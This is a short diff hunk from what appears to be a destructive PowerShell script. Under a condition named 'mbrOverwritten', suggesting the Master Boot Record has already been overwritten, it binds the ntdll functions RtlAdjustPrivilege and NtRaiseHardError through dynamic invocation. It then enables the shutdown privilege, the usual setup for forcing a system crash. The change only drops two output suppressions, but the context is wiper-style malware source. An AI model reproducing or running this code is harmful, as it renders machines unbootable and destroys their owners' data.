@@ -61,8 +61,8 @@ if ($mbrOverwritten) {
         $mb.SetImplementationFlags('PreserveSig')
     }
 
-    Add-DInvoke -DllName "ntdll" -Name "RtlAdjustPrivilege" -ParameterTypes @([Int32], [Boolean], [Boolean], ([Boolean]).MakeByRefType()) -ReturnType ([Void]) | Out-Null
-    Add-DInvoke -DllName "ntdll" -Name "NtRaiseHardError" -ParameterTypes @([UInt32], [UInt32], [UInt32], [IntPtr], [UInt32], ([UInt32]).MakeByRefType()) -ReturnType ([Void]) | Out-Null
+    Add-DInvoke -DllName "ntdll" -Name "RtlAdjustPrivilege" -ParameterTypes @([Int32], [Boolean], [Boolean], ([Boolean]).MakeByRefType()) -ReturnType ([Void])
+    Add-DInvoke -DllName "ntdll" -Name "NtRaiseHardError" -ParameterTypes @([UInt32], [UInt32], [UInt32], [IntPtr], [UInt32], ([UInt32]).MakeByRefType()) -ReturnType ([Void])
 
     $NM = $type.CreateType()
     $NM::RtlAdjustPrivilege(19, $true, $false, [ref]0)
